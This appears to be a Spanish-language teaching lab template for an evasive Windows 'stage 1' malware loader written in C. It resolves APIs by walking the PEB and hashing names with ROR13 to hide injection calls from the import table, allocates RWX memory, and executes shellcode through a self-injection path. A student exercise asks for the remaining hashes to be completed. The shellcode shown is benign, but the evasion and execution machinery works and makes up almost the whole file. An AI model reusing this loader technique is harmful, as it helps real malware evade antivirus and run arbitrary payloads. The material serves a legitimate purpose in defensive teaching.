/**
 * Laboratorio 1 - Ciberdefensa y Evasión Ofensiva (Tema 2.1)
 * Escenario: Operación PhantomLoader (APT2026 / Earth Preta Evolution)
 * Técnica: Dynamic API Resolution via PEB Walk & ROR13 Hash (MITRE ATT&CK T1027.007)
 *
 * Comando de compilación (MinGW-w64 sin librería estándar):
 *   x86_64-w64-mingw32-gcc stage1_loader.c -o stage1_loaderX.exe -s -nostdlib -Wl,--subsystem,windows
 *
 * Notas técnicas de compilación con -nostdlib en MinGW-w64:
 *   1. En <winternl.h> de MinGW-w64, struct _LDR_DATA_TABLE_ENTRY no expone 'BaseDllName'.
 *      Se declara LDR_DATA_TABLE_ENTRY_FULL con el layout completo del PEB_LDR_DATA.
 *   2. NO se debe definir ninguna función llamada 'main()' cuando se compila con '-nostdlib',
 *      porque el compilador MinGW-w64 GCC inserta automáticamente una llamada a '__main'
 *      (de libgcc) dentro de 'main()', provocando el error de enlazado:
 *      "undefined reference to `__main'".
 *      Por ello, se define únicamente 'WinMainCRTStartup(void)' como punto de entrada.
 */

#include <windows.h>
#include <winternl.h>

// Definición completa de LDR_DATA_TABLE_ENTRY compatible con MinGW-w64 (x64 y x86)
typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

// Algoritmo de hash ROR13 para cadenas ASCII (nombres de funciones en Export Table)
DWORD HashStringROR13(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash >> 13) | (hash << 19);
        hash += (DWORD)(unsigned char)(*str++);
    }
    return hash;
}

// Algoritmo de hash ROR13 insensible a mayúsculas para cadenas Unicode (BaseDllName en PEB)
DWORD HashWStringROR13(const wchar_t* str, USHORT byteLen) {
    DWORD hash = 0;
    USHORT count = byteLen / sizeof(wchar_t);
    for (USHORT i = 0; i < count && str[i] != L'\0'; i++) {
        wchar_t c = str[i];
        if (c >= L'A' && c <= L'Z') {
            c += (L'a' - L'A'); // Normalización a minúsculas
        }
        hash = (hash >> 13) | (hash << 19);
        hash += (DWORD)c;
    }
    return hash;
}

// ============================================================================
// RETO DEL ESTUDIANTE:
// Edita y completa esta plantilla para transformar conventional_malware.c en
// tu propio stage1_loader evasivo:
//   1. Ejecuta `python3 audit_iat_hashing.py` para obtener los hashes ROR13 de
//      WriteProcessMemory y CreateRemoteThread y reemplaza los valores 0x00000000.
//   2. Completa la resolución dinámica en ExecuteStage1() usando GetProcAddressByHash
//      para que ninguna de las APIs de inyección aparezca en la IAT.
// ============================================================================

#define HASH_KERNEL32_DLL        0x8FECD63F
#define HASH_VIRTUALALLOC        0x91AFCA54

// TODO [Estudiante]: Reemplaza 0x00000000 con los hashes ROR13 reales calculados
#define HASH_WRITEPROCESSMEMORY  0x00000000
#define HASH_CREATEREMOTETHREAD  0x00000000

// Prototipos de punteros a función para invocación dinámica sin IAT
typedef LPVOID (WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI* fnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

// Obtiene la dirección base de un módulo recorriendo PEB->Ldr->InMemoryOrderModuleList
HMODULE GetModuleByHash(DWORD targetHash) {
#if defined(_M_X64) || defined(__x86_64__)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    if (!pPeb || !pPeb->Ldr) return NULL;

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pHeader = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCurrent = pHeader->Flink;

    while (pCurrent != pHeader) {
        PLDR_DATA_TABLE_ENTRY_FULL pEntry = CONTAINING_RECORD(
            pCurrent,
            LDR_DATA_TABLE_ENTRY_FULL,
            InMemoryOrderLinks
        );

        if (pEntry->BaseDllName.Buffer != NULL && pEntry->BaseDllName.Length > 0) {
            DWORD hash = HashWStringROR13(pEntry->BaseDllName.Buffer, pEntry->BaseDllName.Length);
            if (hash == targetHash) {
                return (HMODULE)pEntry->DllBase;
            }
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

// Extrae la dirección de una función desde IMAGE_EXPORT_DIRECTORY usando API Hashing
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD targetHash) {
    if (!hModule) return NULL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    DWORD exportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRva) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule + exportRva);
    PDWORD pFunctions = (PDWORD)((PBYTE)hModule + pExport->AddressOfFunctions);
    PDWORD pNames = (PDWORD)((PBYTE)hModule + pExport->AddressOfNames);
    PWORD pOrdinals = (PWORD)((PBYTE)hModule + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* funcName = (const char*)((PBYTE)hModule + pNames[i]);
        if (HashStringROR13(funcName) == targetHash) {
            WORD ordinal = pOrdinals[i];
            return (FARPROC)((PBYTE)hModule + pFunctions[ordinal]);
        }
    }
    return NULL;
}

// Lógica principal del Stage 1 Loader (sin dependencias de librería estándar C)
int ExecuteStage1(void) {
    // 1. Obtener kernel32.dll desde el PEB sin llamar a LoadLibraryA ni GetModuleHandle
    HMODULE hKernel32 = GetModuleByHash(HASH_KERNEL32_DLL);
    if (!hKernel32) return 1;

    // 2. Resolver VirtualAlloc dinámicamente (IAT permanece vacía)
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddressByHash(hKernel32, HASH_VIRTUALALLOC);
    if (!pVirtualAlloc) return 2;

    // 3. Reservar memoria ejecutable (RWX)
    LPVOID pMem = pVirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMem) return 3;

    // Payload de prueba benigno (xor rax, rax; ret)
    unsigned char shellcode[] = { 0x48, 0x31, 0xC0, 0xC3 };

    // TODO [Estudiante]:
    // Si ya completaste HASH_WRITEPROCESSMEMORY y HASH_CREATEREMOTETHREAD arriba,
    // resuélvelos con GetProcAddressByHash(hKernel32, ...) para reemplazar las llamadas
    // estáticas de conventional_malware.c.
    if (HASH_WRITEPROCESSMEMORY != 0 && HASH_CREATEREMOTETHREAD != 0) {
        fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressByHash(hKernel32, HASH_WRITEPROCESSMEMORY);
        fnCreateRemoteThread pCreateRemoteThread = (fnCreateRemoteThread)GetProcAddressByHash(hKernel32, HASH_CREATEREMOTETHREAD);
        if (pWriteProcessMemory && pCreateRemoteThread) {
            SIZE_T written = 0;
            HANDLE hSelf = (HANDLE)-1; // Pseudo-handle de GetCurrentProcess() sin importar la API
            pWriteProcessMemory(hSelf, pMem, shellcode, sizeof(shellcode), &written);
            HANDLE hThread = pCreateRemoteThread(hSelf, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
            if (hThread) {
                return 0;
            }
        }
    }

    // Copia manual byte a byte para evitar dependencia de memcpy cuando se usa -nostdlib
    PBYTE dst = (PBYTE)pMem;
    for (SIZE_T i = 0; i < sizeof(shellcode); i++) {
        dst[i] = shellcode[i];
    }

    typedef int (*fnPayload)(void);
    fnPayload run = (fnPayload)pMem;
    return run();
}

// Único punto de entrada para compilación con: -nostdlib -Wl,--subsystem,windows
// (No definir main() evita que GCC inserte una llamada automática a __main)
__attribute__((force_align_arg_pointer))
void WinMainCRTStartup(void) {
    ExecuteStage1();
}
